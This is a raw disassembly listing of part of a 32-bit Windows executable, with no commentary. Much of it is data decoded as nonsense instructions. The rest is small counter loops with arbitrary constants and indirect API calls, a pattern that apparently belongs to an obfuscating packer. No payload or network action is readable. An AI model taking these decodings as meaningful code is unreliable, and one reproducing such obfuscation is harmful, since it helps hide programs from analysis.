  409d0b:	mov    dh,0x1c
  409d0e:	mov    bl,BYTE PTR [eax+0x2bd7f746]
  409d14:	shl    ebx,1
  409d16:	into   
  409d17:	and    edi,DWORD PTR [ebx-0x3f]
  409d1a:	sub    eax,0x4ff5b3e9
  409d1f:	(bad)  
  409d20:	loopne 0x409d44
  409d22:	xor    eax,ebx
  409d24:	cwd    
  409d26:	mov    dl,0x2f
  409d28:	cli    
  409d29:	add    BYTE PTR [edx],0x46
  409d2c:	out    0x94,eax
  409d2e:	pop    edx
  409d2f:	inc    eax
  409d30:	xchg   edx,esi
  409d32:	fimul  DWORD PTR [edi]
  409d34:	fild   QWORD PTR [ebp-0x6f]
  409d37:	dec    di
  409d39:	ret    
  409d3a:	mov    bl,0x82
  409d3c:	pop    esp
  409d3d:	enter  0x4c5,0xe1
  409d41:	mov    eax,0x9069a01a
  409d46:	mov    al,ds:0x264d1d58
  409d4b:	cmp    DWORD PTR [ecx+0x2b],ebx
  409d4e:	jnp    0x409dc5
  409d50:	sbb    eax,0x1c0a2805
  409d55:	inc    ecx
  409d56:	inc    dh
  409d58:	add    BYTE PTR [ebp+0x43c54057],bh
  409d5e:	push   0xbff0aeeb
  409d63:	fsub   st,st(5)
  409d65:	in     al,dx
  409d66:	iret   
  409d67:	test   eax,0x1a7afb04
  409d6c:	sbb    edx,edi
  409d6e:	and    cl,BYTE PTR [edi]
  409d70:	mov    bh,0xe1
  409d72:	xchg   DWORD PTR [edi+0x6a],edi
  409d75:	pusha  
  409d76:	lahf   
  409d77:	mov    ds:0xed3fe771,al
  409d7c:	ret    
  409d7d:	frstor [ecx-0x22]
  409d80:	jb     0x409d07
  409d82:	leave  
  409d83:	mov    DWORD PTR ds:0x433697,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43368b
  409d9c:	sub    DWORD PTR ds:0x43375f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4336d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	add    esi,DWORD PTR [esi-0x1dc743d4]
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	sub    BYTE PTR [edx-0x2c],cl
  409dcd:	in     al,0xbf
  409dcf:	cld    
  409dd0:	xor    esp,DWORD PTR [ebp+0x6]
  409dd3:	(bad)  
  409dd5:	aam    0x33
  409dd7:	(bad)  
  409dd8:	jmp    0xdec3fb3e
  409ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dde:	pop    esp
  409ddf:	(bad)  
  409de0:	pop    edx
  409de1:	out    0x32,al
  409de3:	retf   
  409de4:	or     dh,ah
  409de6:	sub    BYTE PTR [ecx],dl
  409de8:	lods   eax,DWORD PTR ds:[esi]
  409de9:	cwde   
  409dea:	mov    esi,0x102fd38f
  409def:	fst    QWORD PTR ds:0x184997f5
  409df5:	jmp    0x409d8d
  409df7:	lods   al,BYTE PTR ds:[esi]
  409df8:	push   ebx
  409df9:	cmp    BYTE PTR [ebx+0x5a81c898],bh
  409dff:	add    al,0x92
  409e01:	cmp    esp,0x2f
  409e04:	addr16 mov cl,bh
  409e07:	xor    edi,DWORD PTR [edx+0x1]
  409e0a:	mov    ah,0x12
  409e0c:	std    
  409e0d:	mov    ah,0xeb
  409e0f:	dec    esi
  409e10:	pop    ebp
  409e11:	add    al,BYTE PTR [eax+0x4c26f461]
  409e17:	mov    bh,0xe4
  409e19:	mov    bl,0xf8
  409e1b:	and    DWORD PTR [esi+edx*2+0x52],ecx
  409e1f:	jbe    0x409e75
  409e21:	push   es
  409e22:	jae    0x409dc3
  409e24:	enter  0x23ca,0x9
  409e28:	stc    
  409e29:	(bad)  
  409e2b:	adc    BYTE PTR [esi-0x5d],bh
  409e2e:	or     eax,0xff8cae83
  409e33:	(bad)  
  409e34:	(bad)  
  409e35:	clc    
  409e36:	enter  0x5b26,0x31
  409e3a:	jecxz  0x409de9
  409e3c:	or     al,0x38
  409e3e:	data16 xor dl,BYTE PTR [esi-0x6198fc3a]
  409e45:	sbb    DWORD PTR [ebp-0x757cf0f2],ebp
  409e4b:	fldcw  WORD PTR [ebx]
  409e4d:	loopne 0x409e95
  409e4f:	inc    edx
  409e50:	adc    BYTE PTR [eax+0x1aab0593],ah
  409e56:	inc    edi
  409e57:	dec    ecx
  409e58:	leave  
  409e59:	and    BYTE PTR [esi-0x3a5c710c],0x26
  409e60:	jne    0x409e61
  409e62:	cmp    BYTE PTR ds:0x92482c02,ah
  409e68:	pop    ebx
  409e69:	fld    QWORD PTR [esi]
  409e6b:	ds repnz cld 
  409e6e:	mov    esp,0x6fa621
  409e73:	repnz adc ebp,DWORD PTR [edi+0x50105a0e]
  409e7a:	daa    
  409e7b:	inc    esi
  409e7c:	fmul   DWORD PTR [ebx+0x4fe69312]
  409e82:	out    0x93,al
  409e84:	sbb    DWORD PTR [edx+0x10f18d03],0x7588b4e8
  409e8e:	sub    eax,0xda04e379
  409e93:	repz popf 
  409e95:	inc    ebp
  409e96:	add    al,0x11
  409e98:	xchg   ebp,eax
  409e99:	shr    DWORD PTR [edi-0x5b19ebad],0xed
  409ea0:	sahf   
  409ea1:	push   eax
  409ea2:	push   edi
  409ea3:	stos   BYTE PTR es:[edi],al
  409ea4:	out    0x39,al
  409ea6:	mov    ds:0x302714c9,eax
  409eab:	or     ecx,edx
  409ead:	mov    WORD PTR [ecx-0x22],gs
  409eb0:	lods   eax,DWORD PTR ds:[esi]
  409eb1:	push   esi
  409eb2:	or     ebp,DWORD PTR [edx-0x22]
  409eb5:	xor    BYTE PTR [ebx+0x25],bh
  409eb8:	sbb    esp,DWORD PTR [ecx+eiz*4-0x20beb2fb]
  409ebf:	daa    
  409ec0:	inc    ebx
  409ec1:	push   cs
  409ec2:	mov    eax,0x5941cced
  409ec7:	imul   eax,eax,0x54
  409eca:	test   al,0xbd
  409ecc:	mov    ebx,DWORD PTR [esi]
  409ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ecf:	popf   
  409ed0:	arpl   WORD PTR [ebx+0x7],si
  409ed3:	jnp    0x409f17
  409ed5:	sub    edx,edx
  409ed7:	jns    0x409f0b
  409ed9:	std    
  409eda:	mov    eax,ds:0xe01b3771
  409edf:	jb     0x409e9d
  409ee1:	into   
  409ee2:	jecxz  0x409f46
  409ee4:	mov    dh,0x70
  409ee6:	inc    eax
  409ee7:	mov    ecx,0x1460b9ae
  409eec:	(bad)  
  409eed:	jae    0x409f19
  409eef:	cs and cl,al
  409ef2:	jecxz  0x409e8a
  409ef4:	xor    eax,0x56012566
  409ef9:	mov    eax,ds:0xea9f6a9f
  409efe:	and    ebp,esp
  409f00:	dec    ebp
  409f01:	aad    0x27
  409f03:	jne    0x409eb6
  409f05:	(bad)  
  409f06:	fcmovbe st,st(3)
  409f08:	xchg   ecx,eax
  409f09:	dec    esp
  409f0a:	test   al,0x76
  409f0c:	shl    DWORD PTR [ebp+0x4f],cl
  409f0f:	js     0x409f2b
  409f11:	cmp    al,0xdd
  409f13:	loope  0x409f1f
  409f15:	fistp  WORD PTR [ebp-0x5d2c66b1]
  409f1b:	cli    
  409f1c:	in     al,0xb7
  409f1e:	lods   al,BYTE PTR ds:[esi]
  409f1f:	xchg   esi,eax
  409f20:	mov    dh,0x55
  409f22:	das    
  409f23:	inc    ecx
  409f24:	xchg   ebp,eax
  409f25:	test   eax,0xb861f47b
  409f2a:	push   eax
  409f2b:	call   0xbfe5b843
  409f30:	pop    ebx
  409f31:	or     al,0xac
  409f33:	gs jmp 0x409f82
  409f36:	out    dx,al
  409f37:	mov    ah,0xfc
  409f39:	push   esi
  409f3a:	mov    ds:0x7a44b548,eax
  409f3f:	adc    al,0x21
  409f41:	inc    eax
  409f42:	or     al,0x1c
  409f44:	pop    esi
  409f45:	fadd   QWORD PTR [ecx-0x1e2abf79]
  409f4b:	inc    esp
  409f4c:	or     edx,DWORD PTR [ecx+0x2167904f]
  409f52:	fisubr DWORD PTR [ebx]
  409f54:	aas    
  409f55:	fidivr DWORD PTR [edi-0x49]
  409f58:	sub    edi,DWORD PTR [ecx]
  409f5a:	jmp    0x108a1b40
  409f5f:	adc    al,0x13
  409f61:	test   DWORD PTR [eax+0x77b2ece2],0xbfaf0a2b
  409f6b:	xor    ecx,DWORD PTR [edx]
  409f6d:	and    ebx,DWORD PTR [ecx+0x6b]
  409f70:	cld    
  409f71:	jnp    0x409f22
  409f73:	cmp    eax,0x26f41909
  409f78:	rcl    DWORD PTR [eax+0x33],0xc7
  409f7c:	aas    
  409f7d:	or     BYTE PTR [eax],0x6f
  409f80:	and    al,0xec
  409f82:	mov    eax,ds:0x6efef79
  409f87:	xor    al,0x9b
  409f89:	xchg   BYTE PTR [esi],ah
  409f8b:	or     BYTE PTR [eax+ebp*4],dl
  409f8e:	lea    ebx,[eax]
  409f90:	fucomip st,st(6)
  409f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f93:	jmp    0xa944:0x9f3d8072
  409f9a:	inc    eax
  409f9b:	inc    esp
  409f9c:	test   al,0x42
  409f9e:	loop   0x409fa6
  409fa0:	pop    edx
  409fa1:	xchg   esi,eax
  409fa2:	xchg   edx,eax
  409fa3:	scas   al,BYTE PTR es:[edi]
  409fa4:	mov    edx,0xae52c374
  409fa9:	and    DWORD PTR [edi+0x37fb8804],0x7e2c955c
  409fb3:	cs leave 
  409fb5:	mov    BYTE PTR [ecx-0x7408f5f8],dl
  409fbb:	in     eax,dx
  409fbc:	out    0x22,al
  409fbe:	mov    edx,0x9d7824ba
  409fc3:	ret    0x8db3
  409fc6:	popf   
  409fc7:	push   ecx
  409fc8:	cdq    
  409fc9:	mov    edx,0xd1b16519
  409fce:	rcl    DWORD PTR [esi+ebp*2+0xc],0x8d
  409fd3:	adc    eax,0xb26fa024
  409fd8:	enter  0xc44,0xbb
  409fdc:	adc    edx,DWORD PTR [ebp+0x29]
  409fdf:	std    
  409fe0:	das    
  409fe1:	or     al,0x74
  409fe3:	out    dx,eax
  409fe4:	and    eax,0x99a06e6f
  409fe9:	scas   eax,DWORD PTR es:[edi]
  409fea:	sub    DWORD PTR [eax-0x78],0x6530f4fc
  409ff1:	shl    BYTE PTR [esi+0x6bab1785],0x86
  409ff8:	sub    al,0xa0
  409ffa:	idiv   BYTE PTR [edi]
  409ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ffd:	into   
  409ffe:	mov    esp,0x38179509
  40a003:	sub    al,0x17
  40a005:	call   0xf2811d25
  40a00a:	imul   ecx,DWORD PTR [eax+ebp*4],0xffffffce
  40a00e:	push   esp
  40a00f:	pushf  
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x433753
  40a01e:	sbb    DWORD PTR ds:0x43368f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4336e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4336a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4336db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4336db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4336db,ecx
  40a059:	cmp    DWORD PTR ds:0x4336db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4338be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4336db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43368b,0x11
  40a090:	cmp    DWORD PTR ds:0x43368b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43368b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43368b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43368b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43368b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43368b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43368b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433683,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4336ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433693
  40a0ff:	mov    DWORD PTR ds:0x4336ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4336e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	mov    esi,0x82b20d80
  40a12b:	loopne 0x40a1ab
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a158
  40a133:	les    ebp,FWORD PTR [ebp*1+0x78a96b13]
  40a13a:	idiv   BYTE PTR [edx-0x42f1da2]
  40a140:	stos   DWORD PTR es:[edi],eax
  40a141:	pop    di
  40a143:	ror    DWORD PTR [eax-0x7d21dd0],cl
  40a149:	dec    esi
  40a14a:	cld    
  40a14b:	lods   eax,DWORD PTR ds:[esi]
  40a14c:	mov    dh,0xa8
  40a14e:	push   DWORD PTR [edi-0x11e481fa]
  40a154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a155:	pop    ebp
  40a156:	xor    eax,0x66da9921
  40a15b:	rol    DWORD PTR [eax+0x2105cede],1
  40a161:	adc    BYTE PTR [ebx+0x5c],0xa1
  40a165:	rol    ebp,0x9c
  40a168:	mov    ds,WORD PTR [ebx]
  40a16a:	sbb    BYTE PTR [eax-0x71],bl
  40a16d:	add    eax,0xf99ae24e
  40a172:	mov    DWORD PTR [eax+eax*1-0x662c5467],ebp
  40a179:	lock leave 
  40a17b:	aam    0x11
  40a17d:	clc    
  40a17e:	in     al,dx
  40a17f:	sub    al,0x2
  40a181:	pop    esp
  40a182:	push   eax
  40a183:	push   ds
  40a184:	test   eax,0x315c8d6f
  40a189:	mov    dl,0x95
  40a18b:	inc    ebp
  40a18c:	inc    edx
  40a18d:	mov    al,0xe8
  40a18f:	(bad)  
  40a190:	sbb    BYTE PTR [ebx-0x20],al
  40a193:	out    0x5c,al
  40a195:	fwait
  40a196:	xchg   esp,eax
  40a197:	cmp    bh,bh
  40a199:	push   esi
  40a19a:	shl    eax,0xdd
  40a19d:	mov    eax,0x21f89872
  40a1a2:	dec    ebx
  40a1a3:	out    0xd4,eax
  40a1a5:	xor    esp,DWORD PTR [esi-0x4fe5c6fd]
  40a1ab:	cmc    
  40a1ac:	push   ecx
  40a1ad:	inc    edi
  40a1ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b0:	dec    ebp
  40a1b1:	fwait
  40a1b2:	mov    edi,DWORD PTR [eax-0x61]
  40a1b5:	or     bh,dh
  40a1b7:	je     0x40a1d1
  40a1b9:	mov    ds:0x6d2fde94,al
  40a1be:	and    al,0x18
  40a1c0:	pop    ebx
  40a1c1:	jb     0x40a168
  40a1c3:	mov    esi,es
  40a1c5:	enter  0x7568,0xb7
  40a1c9:	push   edi
  40a1ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1cb:	inc    ecx
  40a1cc:	push   ebx
  40a1cd:	xlat   BYTE PTR ds:[ebx]
  40a1ce:	les    ecx,FWORD PTR [edi+0x3e]
  40a1d1:	jl     0x40a1fc
  40a1d3:	mov    ecx,0x68fc8391
  40a1d8:	loope  0x40a22c
  40a1da:	out    dx,al
  40a1db:	push   ecx
  40a1dc:	es jne 0x40a205
  40a1df:	push   edi
  40a1e0:	in     eax,0xba
  40a1e2:	or     ch,BYTE PTR [ebp-0x1b]
  40a1e5:	daa    
  40a1e6:	jbe    0x40a1e5
  40a1e8:	mov    ds:0x4d85576a,eax
  40a1ed:	inc    ecx
  40a1ee:	inc    ecx
  40a1ef:	push   ds
  40a1f0:	push   ss
  40a1f1:	jbe    0x40a17c
  40a1f3:	cli    
  40a1f4:	imul   ebx,edx,0xbebffdf2
  40a1fa:	push   cs
  40a1fb:	clc    
  40a1fc:	lods   al,BYTE PTR ds:[esi]
  40a1fd:	inc    edx
  40a1fe:	sbb    al,0x57
  40a200:	in     al,0x31
  40a202:	out    dx,eax
  40a203:	jp     0x40a209
  40a205:	xchg   ebp,eax
  40a206:	dec    esp
  40a207:	mov    edi,0x5da497e1
  40a20c:	(bad)  
  40a20e:	fstp   TBYTE PTR [ecx+0x7010e6f]
  40a214:	ds push eax
  40a217:	cld    
  40a218:	fild   WORD PTR [edx+0x78]
  40a21b:	popf   
  40a21c:	(bad)  
  40a21e:	and    eax,0x6d8b18c1
  40a223:	adc    esi,0xa05aba64
  40a229:	loopne 0x40a1d6
  40a22b:	imul   BYTE PTR [edx+edx*8+0x28]
  40a22f:	popf   
  40a230:	out    dx,al
  40a231:	pop    ebp
  40a232:	rcr    DWORD PTR [edi],0x55
  40a235:	jp     0x40a2af
  40a237:	or     ch,BYTE PTR [ecx+eax*2-0x29]
  40a23b:	loope  0x40a26e
  40a23d:	fsubr  st(1),st
  40a23f:	adc    dh,bh
  40a241:	(bad)  
  40a242:	and    al,0xb2
  40a244:	fisubr DWORD PTR [edx-0x18]
  40a247:	xor    BYTE PTR [ecx-0x6a],bh
  40a24a:	mov    ebp,0x71122cfd
  40a24f:	mov    WORD PTR [edi-0x2c],?
  40a252:	adc    eax,0x95d82b8c
  40a257:	cmp    ecx,ecx
  40a259:	icebp  
  40a25a:	jle    0x40a2a7
  40a25c:	pop    esi
  40a25d:	pop    esp
  40a25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a25f:	fwait
  40a260:	pop    ebp
  40a261:	dec    esi
  40a262:	xor    ch,cl
  40a264:	test   al,0x83
  40a266:	dec    BYTE PTR es:[esi+0x6c5b835e]
  40a26d:	pop    ecx
  40a26e:	daa    
  40a26f:	icebp  
  40a270:	fs popf 
  40a272:	jmp    DWORD PTR [edi-0x7ce55448]
  40a278:	dec    ebp
  40a279:	clc    
  40a27a:	or     al,0xb1
  40a27c:	cmp    esi,ebp
  40a27e:	push   ecx
  40a27f:	pop    ds
  40a280:	dec    edi
  40a281:	inc    edi
  40a282:	inc    ebp
  40a283:	stos   BYTE PTR es:[edi],al
  40a284:	add    DWORD PTR [ebp+0x10852c15],ebp
  40a28a:	adc    al,0x78
  40a28c:	add    eax,0x9fae8638
  40a291:	loopne 0x40a249
  40a293:	(bad)  
  40a294:	xor    eax,0xd7620fb0
  40a299:	and    eax,0x7e6e81a3
  40a29e:	mov    ss,WORD PTR [eax+0x635f4c1b]
  40a2a4:	mov    bh,0xe8
  40a2a6:	add    edi,DWORD PTR [eax]
  40a2a8:	sbb    DWORD PTR [esi-0x6],esp
  40a2ab:	in     eax,dx
  40a2ac:	jle    0x40a283
  40a2ae:	cmp    bl,BYTE PTR [ebx-0x8]
  40a2b1:	jbe    0x40a261
  40a2b3:	daa    
  40a2b4:	adc    ah,BYTE PTR [edx+ebp*1+0x6b704041]
  40a2bb:	clc    
  40a2bc:	xchg   edx,eax
  40a2bd:	call   FWORD PTR [esi+edx*8]
  40a2c0:	add    ah,BYTE PTR [eax+ebp*4-0x1f98bb99]
  40a2c7:	pop    esp
  40a2c8:	mov    ebx,0x8b91b508
  40a2cd:	cmp    dl,BYTE PTR [edx]
  40a2cf:	sub    al,0x3e
  40a2d1:	aas    
  40a2d2:	adc    al,0xdf
  40a2d4:	lds    edi,FWORD PTR [esi+0x7]
  40a2d7:	(bad)  
  40a2d8:	jp     0x40a26b
  40a2da:	dec    edi
  40a2db:	xor    al,0x7f
  40a2dd:	jg     0x40a309
  40a2df:	sub    DWORD PTR [eax-0x15559121],0xfd953ae8
  40a2e9:	and    ah,BYTE PTR [ebx-0x73]
  40a2ec:	int3   
  40a2ed:	out    dx,al
  40a2ee:	xchg   edi,eax
  40a2ef:	bound  ebx,QWORD PTR [ecx]
  40a2f1:	or     al,0x88
  40a2f3:	(bad)  
  40a2f4:	jmp    0xcffcd548
  40a2f9:	xchg   ecx,eax
  40a2fa:	xchg   esi,eax
  40a2fb:	xchg   BYTE PTR [edi-0x18940d1a],ch
  40a301:	xchg   ecx,eax
  40a302:	sub    BYTE PTR [ebx+ebx*4-0x56],dl
  40a306:	sahf   
  40a307:	arpl   WORD PTR [esp+ecx*1+0x43],ax
  40a30b:	or     dl,dl
  40a30d:	mov    dl,0x2e
  40a30f:	loope  0x40a340
  40a311:	cmp    dl,BYTE PTR [ecx-0x5c]
  40a314:	out    dx,al
  40a315:	add    BYTE PTR [ebp-0x42],bl
  40a318:	sub    WORD PTR [ebx+0x3983166f],sp
  40a31f:	push   0x4e186ab9
  40a324:	call   0x86ad:0xb1fad9ab
  40a32b:	mov    ch,0x3c
  40a32d:	pop    es
  40a32e:	or     al,0x61
  40a330:	cmp    cl,bl
  40a332:	(bad)  
  40a333:	cdq    
  40a334:	daa    
  40a335:	xchg   ecx,eax
  40a336:	inc    eax
  40a337:	imul   ebx,edx,0xb3fc6dfc
  40a33d:	stc    
  40a33e:	add    al,0xce
  40a340:	inc    BYTE PTR [esi+0x79]
  40a343:	jge    0x40a37e
  40a345:	cmp    dl,bh
  40a347:	fcmovnu st,st(4)
  40a349:	xchg   esp,eax
  40a34a:	xchg   esi,eax
  40a34b:	adc    bl,bh
  40a34d:	call   0xda1f:0x7bd96b0d
  40a354:	pusha  
  40a355:	test   BYTE PTR [ebp+0x31bbe518],al
  40a35b:	out    dx,eax
  40a35c:	push   esi
  40a35d:	test   al,0xac
  40a35f:	adc    BYTE PTR [ebx+0x16],dl
  40a362:	jl     0x40a375
  40a364:	rcl    BYTE PTR [eax-0x51],cl
  40a367:	mov    edi,0xdfdbe024
  40a36c:	fldenv [ebx+0x748d67a1]
  40a372:	xor    al,0x95
  40a374:	in     ax,0x24
  40a377:	stos   BYTE PTR es:[edi],al
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x43367b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43367b
  40a394:	inc    eax
  40a395:	mov    ds:0x43367b,eax
  40a39a:	cmp    DWORD PTR ds:0x43367b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43367b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43376f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4336eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4336e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4336e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4336e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433717
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4336e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4336e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4336e7,eax
  40a43a:	mov    eax,ds:0x4336e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4336e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43369f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4337af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4337a3,0x433727
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433687,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	int3   
  40a49c:	inc    esp
  40a49d:	bound  ebp,QWORD PTR [eax+0x7e7eee4c]
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	(bad)  [ecx+0x23]
  40a4aa:	jne    0x40a46d
  40a4ac:	push   es
  40a4ad:	mov    BYTE PTR [edi+edx*1],bh
  40a4b0:	xchg   esi,eax
  40a4b1:	stos   BYTE PTR es:[edi],al
  40a4b2:	xchg   ebx,eax
  40a4b3:	xchg   bh,ch
  40a4b5:	adc    BYTE PTR [ecx-0x58],al
  40a4b8:	xlat   BYTE PTR ds:[ebx]
  40a4b9:	fcomp  DWORD PTR [eax+0x30]
  40a4bc:	call   0xbd5f:0x922a7c1a
  40a4c3:	hlt    
  40a4c4:	push   ebp
  40a4c5:	push   ss
  40a4c6:	into   
  40a4c7:	cmp    ebp,DWORD PTR [edx+0x2e275224]
  40a4cd:	dec    eax
  40a4ce:	cwde   
  40a4cf:	mov    al,ds:0x51b97f89
  40a4d4:	loope  0x40a550
  40a4d6:	enter  0x618b,0xe7
  40a4da:	stc    
  40a4db:	(bad)  
  40a4dd:	sar    DWORD PTR [esi-0x28],cl
  40a4e0:	int3   
  40a4e1:	fild   QWORD PTR [ecx+ebx*1]
  40a4e4:	daa    
  40a4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e6:	repnz aas 
  40a4e8:	aas    
  40a4e9:	(bad)  
  40a4ea:	xor    eax,0x129e8243
  40a4ef:	jbe    0x40a489
  40a4f1:	(bad)  
  40a4f2:	jecxz  0x40a543
  40a4f4:	rcr    BYTE PTR [ebx-0x49],0x3c
  40a4f8:	mov    fs,WORD PTR [edx-0x30607adf]
  40a4fe:	add    eax,0x9ea3a709
  40a503:	mov    al,0x29
  40a505:	aam    0x8f
  40a507:	idiv   BYTE PTR [ebx+0x6c710439]
  40a50d:	xor    al,0x39
  40a50f:	xor    BYTE PTR [ebp-0x48],dh
  40a512:	sub    eax,ecx
  40a514:	sti    
  40a515:	ss leave 
  40a517:	mov    ecx,0x6ae1852
  40a51c:	mov    esi,0x1f4ce930
  40a521:	int    0x77
  40a523:	dec    edi
  40a524:	mov    eax,0x155f7c1d
  40a529:	pop    esi
  40a52a:	mov    ebx,0x4cacaeee
  40a52f:	mov    edx,0xe33e4aa9
  40a534:	ins    DWORD PTR es:[edi],dx
  40a535:	sub    edx,esp
  40a537:	push   ebp
  40a538:	adc    al,0x38
  40a53a:	pop    esp
  40a53b:	and    eax,0x262e13de
  40a540:	jae    0x40a55e
  40a542:	out    dx,al
  40a543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a544:	or     bh,BYTE PTR [edx+0x72]
  40a547:	xor    BYTE PTR [eax+0x1b],ch
  40a54a:	loop   0x40a573
  40a54c:	xchg   ecx,eax
  40a54d:	dec    ebp
  40a54e:	fbstp  TBYTE PTR ds:0x80ece0dd
  40a554:	adc    bl,BYTE PTR [edx]
  40a556:	or     dh,cl
  40a558:	jns    0x40a4f7
  40a55a:	fucom  st(7)
  40a55c:	in     eax,dx
  40a55d:	fwait
  40a55e:	cwde   
  40a55f:	in     eax,dx
  40a560:	adc    al,0x58
  40a562:	adc    bh,BYTE PTR [edx+0x67f3a0c0]
  40a568:	xchg   ecx,eax
  40a569:	cmp    DWORD PTR [esi],edx
  40a56b:	mov    dl,BYTE PTR [edi]
  40a56d:	adc    DWORD PTR [esi+0x3c13c871],0xffffff81
  40a574:	out    dx,al
  40a575:	mov    ch,0x97
  40a577:	in     eax,0x83
  40a579:	inc    ebx
  40a57a:	xchg   esi,eax
  40a57b:	das    
  40a57c:	sub    al,0xef
  40a57e:	jge    0x40a53f
  40a580:	test   al,0xd0
  40a582:	jp     0x40a588
  40a584:	or     al,0x32
  40a586:	mov    ds:0x133bf211,al
  40a58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a58c:	repnz mov BYTE PTR [edi+0x54],bl
  40a590:	fdiv   st(1),st
  40a592:	mov    eax,ds:0xa6fa1d3d
  40a597:	addr16 push 0x736c181a
  40a59d:	cdq    
